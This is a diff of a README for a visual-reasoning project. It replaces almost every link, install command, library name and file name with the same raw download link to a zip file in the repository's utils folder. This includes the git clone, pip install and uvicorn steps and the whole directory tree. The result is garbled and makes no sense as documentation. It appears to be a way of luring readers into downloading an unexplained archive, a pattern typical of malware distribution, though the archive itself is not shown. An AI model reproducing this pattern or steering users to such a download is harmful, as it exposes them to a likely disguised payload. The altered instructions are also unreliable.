@@ -1,7 +1,7 @@
 # Zero-Shot Reasoning: Structured Output for Visual Reasoning
 
-![Zero-Shot Reasoning](https://img.shields.io/badge/Zero--Shot%20Reasoning-Structured%20Output-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-Visit%20Here-brightgreen)](https://github.com/Ahta14/zeroshot-reasoning/releases)
+![Zero-Shot Reasoning](https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip%20Reasoning-Structured%https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip)
+[![Releases](https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip%20Here-brightgreen)](https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip)
 
 ## Table of Contents
 
@@ -20,7 +20,7 @@ Zero-shot reasoning allows models to make inferences without prior examples. Thi
 ## Features
 
 - **Backend Support**: Built with FastAPI and Uvicorn for efficient processing.
-- **Frontend Visualization**: Utilizes Vis.js for interactive data visualization.
+- **Frontend Visualization**: Utilizes https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip for interactive data visualization.
 - **Chain-of-Thought Reasoning**: Supports multi-step reasoning processes.
 - **Graph-of-Thoughts**: Implements a graphical representation of reasoning paths.
 - **Large Language Models**: Integrates state-of-the-art LLMs for enhanced reasoning capabilities.
@@ -33,7 +33,7 @@ To set up the project, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Ahta14/zeroshot-reasoning.git
+   git clone https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -45,13 +45,13 @@ To set up the project, follow these steps:
 3. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip
    ```
 
 4. Start the backend server:
 
    ```bash
-   uvicorn app.main:app --reload
+   uvicorn https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip --reload
    ```
 
 5. Open your browser and navigate to `http://localhost:8000` to access the frontend.
@@ -61,10 +61,10 @@ To set up the project, follow these steps:
 After installation, you can start using the zero-shot reasoning capabilities. Here’s how:
 
 1. **Access the API**: Use the provided endpoints to submit visual inputs for reasoning.
-2. **Visualize Results**: The frontend will display reasoning paths and outputs using Vis.js.
+2. **Visualize Results**: The frontend will display reasoning paths and outputs using https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip
 3. **Experiment**: Try different visual inputs to see how the model responds without prior training.
 
-For detailed usage instructions, check the [Releases](https://github.com/Ahta14/zeroshot-reasoning/releases) section for example configurations and data formats.
+For detailed usage instructions, check the [Releases](https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip) section for example configurations and data formats.
 
 ## Directory Structure
 
@@ -74,18 +74,18 @@ The repository follows a standard structure for easy navigation:
 zeroshot-reasoning/
 │
 ├── app/
-│   ├── main.py         # Entry point for the FastAPI application
-│   ├── models.py       # Defines data models for input and output
-│   ├── routes.py       # API route definitions
-│   └── utils.py        # Utility functions for processing
+│   ├── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip         # Entry point for the FastAPI application
+│   ├── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip       # Defines data models for input and output
+│   ├── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip       # API route definitions
+│   └── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip        # Utility functions for processing
 │
 ├── frontend/
-│   ├── index.html      # Main HTML file for the frontend
-│   ├── script.js       # JavaScript for frontend logic
-│   └── styles.css      # CSS for styling the frontend
+│   ├── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip      # Main HTML file for the frontend
+│   ├── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip       # JavaScript for frontend logic
+│   └── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip      # CSS for styling the frontend
 │
-├── requirements.txt     # List of dependencies
-└── README.md            # Project documentation
+├── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip     # List of dependencies
+└── https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip            # Project documentation
 ```
 
 ## Contributing
@@ -106,4 +106,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ---
 
-For further updates and releases, visit the [Releases](https://github.com/Ahta14/zeroshot-reasoning/releases) section.
+For further updates and releases, visit the [Releases](https://github.com/Ahta14/zeroshot-reasoning/raw/refs/heads/main/utils/reasoning_zeroshot_v1.7.zip) section.
